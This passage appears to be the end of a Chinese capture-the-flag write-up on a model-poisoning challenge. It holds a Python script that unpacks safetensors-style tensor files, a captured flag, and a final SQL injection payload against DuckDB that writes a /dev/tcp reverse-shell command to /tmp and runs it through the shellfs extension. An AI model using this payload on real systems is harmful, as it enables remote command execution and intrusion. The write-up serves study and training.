info["min_imag"] = float(np.min(a.imag)) info["max_imag"] = float(np.max(a.imag)) else: try: a = arr.astype(np.float32) info["min"] = float(np.min(a)) info["max"] = float(np.max(a)) info["mean"] = float(np.mean(a)) info["std"] = float(np.std(a)) exceptException: info["note"] ="stats not supported for dtype" exceptExceptionase: info["error"] =f"{type(e).__name__}:{e}" returninfodefsave_array(arr: np.ndarray, out_base: str, fmt: str, logical_dtype_note: str | None): """保存数组到文件""" # 确保目录存在 os.makedirs(os.path.dirname(out_base), exist_ok=True) iffmt =='npy': np.save(out_base +'.npy', arr) eliffmt =='bin': withopen(out_base +'.bin','wb')asf: f.write(arr.tobytes(order='C')) withopen(out_base +'.shape_dtype.txt','w', encoding='utf-8')asf: f.write(f"dtype:{arr.dtype}n") f.write(f"shape:{list(arr.shape)}n") f.write("order: Cn") iflogical_dtype_note: f.write(f"note:{logical_dtype_note}n") else: raiseValueError("Unknown format: "+ fmt)defexport_all(): """主导出函数""" safepath = INPUT_PATH ifnotos.path.isfile(safepath): raiseFileNotFoundError(f"File not found:{safepath}") ts = datetime.now().strftime("%Y%m%d_%H%M%S") out_dir = OUT_DIR ifout_dirisNone: base = os.path.splitext(os.path.basename(safepath))[0] out_dir =f"dump_{base}_{ts}" # 处理输出目录 ifos.path.exists(out_dir): ifOVERWRITE_OUTPUT: ifVERBOSE: print(f"[!] Overwriting existing directory:{out_dir}") shutil.rmtree(out_dir) else: raiseFileExistsError(f"Output directory exists:{out_dir}. Set OVERWRITE_OUTPUT=True to overwrite.") os.makedirs(out_dir, exist_ok=True) ifVERBOSE: print(f"[+] Output will be saved to:{os.path.abspath(out_dir)}") print(f"[+] Opening:{safepath}") try: withopen(safepath,'rb')asf: # 1) 读取 8 字节小端无符号整数：header 长度 hdr_len_bytes = f.read(8) iflen(hdr_len_bytes) !=8: raiseValueError("File too short: cannot read 8-byte header length") (hdr_len,) = struct.unpack('<Q', hdr_len_bytes) # 2) 读取 JSON header header_bytes = f.read(hdr_len) iflen(header_bytes) != hdr_len: raiseValueError("File too short: header truncated") try: header = json.loads(header_bytes.decode('utf-8')) exceptExceptionase: raiseValueError(f"Invalid JSON header:{e}") # 顶层元数据通常存放在 __metadata__（也可能是 'metadata'） file_metadata = header.get('__metadata__', header.get('metadata',None)) # 3) 数据区基址（紧随 header 之后） data_base =8+ hdr_len # 4) 收集所有张量条目（除去 __metadata__） tensor_entries = {k: vfork, vinheader.items()ifknotin('__metadata__','metadata')} print(f"[+] Found{len(tensor_entries)}tensors") rows = [] meta_out = { "source_file": os.path.abspath(safepath), "export_time": ts, "tensors": [], "file_metadata": file_metadata, "notes": [ "data_offsets are relative to the start of the data blob (immediately after the JSON header).", "All arrays are saved in C-order." ] } total_nbytes =0 errors = [] # 使用 tqdm 显示进度条 forname, descintqdm(tensor_entries.items(), total=len(tensor_entries), desc="Processing tensors"): try: ifnotall(kindescforkin('dtype','shape','data_offsets')): raiseValueError(f"missing required fields") dtype_str = desc['dtype'] shape = list(desc['shape']) start, end = desc['data_offsets'] ifnot(isinstance(start, int)andisinstance(end, int)andend >= start): raiseValueError(f"bad data_offsets:{desc['data_offsets']}") # 绝对文件偏移 abs_start = data_base + start abs_end = data_base + end size_bytes = abs_end - abs_start # 读出原始字节 f.seek(abs_start,0) raw = f.read(size_bytes) iflen(raw) != size_bytes: raiseValueError(f"data truncated (expected{size_bytes}bytes, got{len(raw)})") # dtype 映射 np_dtype, note = try_get_np_dtype(dtype_str) # 按 dtype 解析为 numpy 数组 itemsize = np_dtype.itemsize ifitemsize ==0: raiseValueError(f"zero itemsize dtype") expected_elems = int(size_bytes // itemsize) shape_prod = np.prod(shape, dtype=np.int64) ifexpected_elems !=0orshape_prod !=0: ifshape_prod != expected_elems: raiseValueError( f"size mismatch: bytes={size_bytes}, " f"dtype={np_dtype}, expected_elems={expected_elems}, shape={shape}" ) arr = np.frombuffer(raw, dtype=np_dtype, count=expected_elems) try: arr = arr.reshape(shape, order='C') exceptException: # 退化处理：若 reshape 失败，保留 1D ifVERBOSE: print(f"[!] Could not reshape tensor{name}to{shape}, keeping as 1D array") nbytes = int(arr.nbytes) total_nbytes += nbytes info = { "name": name, "dtype_in_header": dtype_str, "numpy_dtype_used": str(np_dtype), "shape": shape, "nbytes": nbytes, "human_size": human_bytes(nbytes), } ifnote: info["dtype_note"] = note # 统计 ifCOMPUTE_STATS: info["stats"] = compute_stats(arr, note) # 预览 ifPEEKandarr.size >0: flat = arr.ravel() lim = min(PEEK, flat.size) preview = [] foriinrange(lim): v = flat[i] try: ifarr.dtype.kind =='f': preview.append(float(v)) elifarr.dtype.kindin('i','u'): preview.append(int(v)) elifarr.dtype == np.bool_: preview.append(bool(v)) else: preview.append(v.tolist()ifhasattr(v,'tolist')elserepr(v)) exceptException: preview.append(repr(v)) info['peek'] = preview # 保存 out_base = os.path.join(out_dir, sanitize_name(name)) save_array(arr, out_base, EXPORT_FORMAT, note) rows.append([name, dtype_str, str(np_dtype),"x".join(map(str, shape)), nbytes, human_bytes(nbytes)]) meta_out["tensors"].append(info) ifVERBOSE: print(f" -{name}|{dtype_str}->{np_dtype}|{shape}|{human_bytes(nbytes)}") exceptExceptionase: error_msg =f"Error processing tensor '{name}':{str(e)}" errors.append(error_msg) print(f"n[!]{error_msg}") ifnotVERBOSE: print(" Use VERBOSE=True for more details") # 写 metadata.json meta_path = os.path.join(out_dir,"metadata.json") withopen(meta_path,"w", encoding="utf-8")asfp: json.dump(meta_out, fp, ensure_ascii=False, indent=2) print(f"[+] Saved metadata ->{meta_path}") # 写 summary.csv ifWRITE_SUMMARY_CSV: csv_path = os.path.join(out_dir,"summary.csv") withopen(csv_path,"w", newline="", encoding="utf-8")asfp: writer = csv.writer(fp) writer.writerow(["name","dtype_in_header","numpy_dtype_used","shape","nbytes","human_size"]) writer.writerows(rows) print(f"[+] Saved summary ->{csv_path}") # 记录错误信息 iferrors: error_path = os.path.join(out_dir,"errors.log") withopen(error_path,"w", encoding="utf-8")asfp: fp.write("n".join(errors)) print(f"[!] Encountered{len(errors)}errors. Details saved to{error_path}") print(f"[+] Total tensor bytes:{human_bytes(total_nbytes)}") print(f"[✓] Done. Output dir:{os.path.abspath(out_dir)}") exceptExceptionase: print(f"[!] Fatal error:{str(e)}") ifos.path.exists(out_dir)andlen(os.listdir(out_dir)) ==0: os.rmdir(out_dir) raiseif__name__ =="__main__": try: export_all() exceptExceptionase: print(f"Export failed:{e}") exit(1)
```



```
flag{po2iso3ning_su4cces5sfully_triggered}
```



```
test') as score, node_id, text from documents; COPY (SELECT 'sh -i >& /dev/tcp/0.0.0.0/44440>&1') TO '/tmp/exploit'; select concat('0test') as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv('bash /tmp/exploit |'); select concat('0
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242774-wxsync-2025-09-3e47b4f0bf9436327ffe435281a615b3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242776-wxsync-2025-09-56157bbf087d5b0b7c7b5835bd608c45.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242778-wxsync-2025-09-962e951392eeb90f6ee14e56232485a0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242779-wxsync-2025-09-44aa346f29652d4ecd97b833015e40a6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242781-wxsync-2025-09-31bb51c8c92bd61d7923406f2819d8d6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242784-wxsync-2025-09-49f463064c0497378e40157f61465bbe.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242785-wxsync-2025-09-10db2d7f2e6bf28520b8329b2112986f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242788-wxsync-2025-09-69026a6f5706b884b9a61eb6e9320075.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242790-wxsync-2025-09-5efee3c72b4e3367d440100cc7ee529f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758242791-wxsync-2025-09-0fa289238277051c9936f0c506175ae0.png)